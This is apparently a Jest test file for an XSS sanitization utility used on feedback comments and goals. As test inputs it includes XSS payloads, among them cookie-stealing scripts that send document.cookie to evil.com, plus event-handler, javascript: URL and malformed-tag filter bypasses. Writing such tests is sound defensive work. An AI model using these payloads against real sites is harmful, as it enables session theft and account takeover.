/**
 * Tests for XSS Sanitization Utility
 */

import { 
  sanitizeString, 
  sanitizeStringArray, 
  sanitizeFeedbackContent,
  sanitizeComment,
  sanitizeGoal,
  sanitizeGoals
} from '../../../src/shared/utils/sanitize.js';

describe('sanitizeString', () => {
  it('should strip script tags', () => {
    const malicious = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
    expect(sanitizeString(malicious)).toBe('');
  });

  it('should strip script tags and preserve surrounding text', () => {
    const malicious = 'Hello <script>alert("xss")</script>World';
    expect(sanitizeString(malicious)).toBe('Hello World');
  });

  it('should strip inline event handlers', () => {
    const malicious = '<img src="x" onerror="alert(1)">';
    const result = sanitizeString(malicious);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('alert');
  });

  it('should strip href javascript:', () => {
    const malicious = '<a href="javascript:alert(1)">Click me</a>';
    const result = sanitizeString(malicious);
    expect(result).not.toContain('javascript:');
  });

  it('should strip style tags', () => {
    const malicious = '<style>body { display: none; }</style>';
    expect(sanitizeString(malicious)).toBe('');
  });

  it('should strip iframe tags', () => {
    const malicious = '<iframe src="https://evil.com"></iframe>';
    expect(sanitizeString(malicious)).toBe('');
  });

  it('should strip object/embed tags', () => {
    const malicious = '<object data="flash.swf"></object><embed src="flash.swf">';
    const result = sanitizeString(malicious);
    // xss library may leave [removed] marker, but dangerous content is neutralized
    expect(result).not.toContain('<object');
    expect(result).not.toContain('<embed');
    expect(result).not.toContain('flash.swf');
  });

  it('should strip all HTML tags from normal formatting', () => {
    const input = '<b>Bold</b> and <i>italic</i> text';
    expect(sanitizeString(input)).toBe('Bold and italic text');
  });

  it('should handle nested tags', () => {
    const malicious = '<div><script>alert(1)</script></div>';
    expect(sanitizeString(malicious)).toBe('');
  });

  it('should handle encoded HTML entities in script', () => {
    // Note: The xss library handles common encoding attacks
    const malicious = '&lt;script&gt;alert(1)&lt;/script&gt;';
    const result = sanitizeString(malicious);
    // Encoded entities should remain harmless text
    expect(result).not.toContain('<script>');
  });

  it('should trim whitespace', () => {
    expect(sanitizeString('  hello world  ')).toBe('hello world');
  });

  it('should handle null/undefined', () => {
    expect(sanitizeString(null)).toBe('');
    expect(sanitizeString(undefined)).toBe('');
  });

  it('should handle non-string values', () => {
    expect(sanitizeString(123 as any)).toBe('');
    expect(sanitizeString({} as any)).toBe('');
  });

  it('should preserve legitimate content', () => {
    const goodContent = 'Great job on the project! Your code was clean and well-documented.';
    expect(sanitizeString(goodContent)).toBe(goodContent);
  });

  it('should preserve special characters that are not XSS', () => {
    // Note: angle brackets are treated as potential tags and stripped
    const content = "User's feedback: This is (exciting) but also {challenging}!";
    const result = sanitizeString(content);
    expect(result).toContain("User's feedback");
    expect(result).toContain('exciting');
    expect(result).toContain('challenging');
  });
});

describe('sanitizeStringArray', () => {
  it('should sanitize all strings in array', () => {
    const input = [
      'Good feedback',
      '<script>alert(1)</script>Bad',
      'Another <b>comment</b>'
    ];
    const result = sanitizeStringArray(input);
    expect(result).toEqual([
      'Good feedback',
      'Bad',
      'Another comment'
    ]);
  });

  it('should handle empty array', () => {
    expect(sanitizeStringArray([])).toEqual([]);
  });

  it('should handle null/undefined', () => {
    expect(sanitizeStringArray(null)).toEqual([]);
    expect(sanitizeStringArray(undefined)).toEqual([]);
  });

  it('should filter out non-string values', () => {
    const input = ['valid', 123, 'also valid', null, 'third'] as any[];
    const result = sanitizeStringArray(input);
    expect(result).toEqual(['valid', 'also valid', 'third']);
  });
});

describe('sanitizeFeedbackContent', () => {
  it('should sanitize all text fields in feedback content', () => {
    const maliciousContent = {
      overallComment: '<script>steal()</script>Great work!',
      strengths: ['Good <script>x</script>communication', '<b>Leadership</b>'],
      areasForImprovement: ['<img onerror="alert(1)">Time management'],
      specificExamples: ['<iframe>hack</iframe>Project delivery'],
      recommendations: ['<style>*{display:none}</style>Consider mentoring'],
      confidential: true
    };

    const result = sanitizeFeedbackContent(maliciousContent);

    expect(result.overallComment).toBe('Great work!');
    expect(result.strengths).toEqual(['Good communication', 'Leadership']);
    expect(result.areasForImprovement).toEqual(['Time management']);
    expect(result.specificExamples).toEqual(['Project delivery']);
    expect(result.recommendations).toEqual(['Consider mentoring']);
    expect(result.confidential).toBe(true);
  });

  it('should handle missing/empty content', () => {
    const result = sanitizeFeedbackContent(null);
    expect(result).toEqual({
      overallComment: '',
      strengths: [],
      areasForImprovement: [],
      specificExamples: [],
      recommendations: [],
      confidential: false
    });
  });

  it('should handle partial content', () => {
    const result = sanitizeFeedbackContent({
      overallComment: 'Just a comment'
    });
    expect(result.overallComment).toBe('Just a comment');
    expect(result.strengths).toEqual([]);
    expect(result.confidential).toBe(false);
  });
});

describe('sanitizeComment', () => {
  it('should sanitize comment content', () => {
    const malicious = '<script>document.cookie</script>Thanks for feedback!';
    expect(sanitizeComment(malicious)).toBe('Thanks for feedback!');
  });
});

describe('sanitizeGoal', () => {
  it('should sanitize goal fields', () => {
    const maliciousGoal = {
      title: '<script>x</script>Improve skills',
      description: '<b>Learn</b> new <script>hack</script>frameworks',
      category: '<img onerror=alert(1)>development',
      priority: 'high',
      targetDate: '2024-12-31'
    };

    const result = sanitizeGoal(maliciousGoal);

    expect(result.title).toBe('Improve skills');
    expect(result.description).toBe('Learn new frameworks');
    // Category should be stripped of XSS but xss lib may leave [removed] marker
    expect(result.category).not.toContain('<img');
    expect(result.category).not.toContain('onerror');
    expect(result.category).toContain('development');
    expect(result.priority).toBe('high');
    expect(result.targetDate).toBe('2024-12-31');
  });

  it('should handle null/empty goal', () => {
    const result = sanitizeGoal(null);
    expect(result.title).toBe('');
    expect(result.category).toBe('development');
    expect(result.priority).toBe('medium');
  });
});

describe('sanitizeGoals', () => {
  it('should sanitize array of goals', () => {
    const goals = [
      { title: '<script>x</script>Goal 1', description: 'Desc 1', category: 'dev', priority: 'high', targetDate: null },
      { title: 'Goal 2', description: '<b>Desc</b> 2', category: 'personal', priority: 'low', targetDate: '2024-12-31' }
    ];

    const result = sanitizeGoals(goals);

    expect(result.length).toBe(2);
    expect(result[0].title).toBe('Goal 1');
    expect(result[1].description).toBe('Desc 2');
  });

  it('should handle null/undefined', () => {
    expect(sanitizeGoals(null)).toEqual([]);
    expect(sanitizeGoals(undefined)).toEqual([]);
  });
});

describe('Real-world XSS attack patterns', () => {
  const xssPayloads = [
    // Cookie stealing
    '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
    '<script>new Image().src="https://evil.com?"+document.cookie</script>',
    
    // DOM manipulation
    '<script>document.body.innerHTML=""</script>',
    
    // Event handler XSS
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<div onmouseover=alert(1)>hover me</div>',
    
    // Protocol handlers
    '<a href="javascript:alert(1)">click</a>',
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    
    // CSS-based attacks
    '<style>@import "https://evil.com/steal.css"</style>',
    '<div style="background:url(javascript:alert(1))">',
    
    // Unicode/encoding attacks
    '<scr\x00ipt>alert(1)</script>',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    
    // Nested/malformed tags
    '<<script>script>alert(1)<</script>/script>',
    '<scri<script>pt>alert(1)</scr</script>ipt>',
  ];

  xssPayloads.forEach((payload, index) => {
    it(`should neutralize XSS payload ${index + 1}`, () => {
      const result = sanitizeString(payload);
      
      // Should not contain executable script content
      expect(result).not.toMatch(/<script/i);
      expect(result).not.toMatch(/javascript:/i);
      expect(result).not.toMatch(/onerror/i);
      expect(result).not.toMatch(/onload/i);
      expect(result).not.toMatch(/onmouseover/i);
      expect(result).not.toMatch(/<style/i);
    });
  });
});

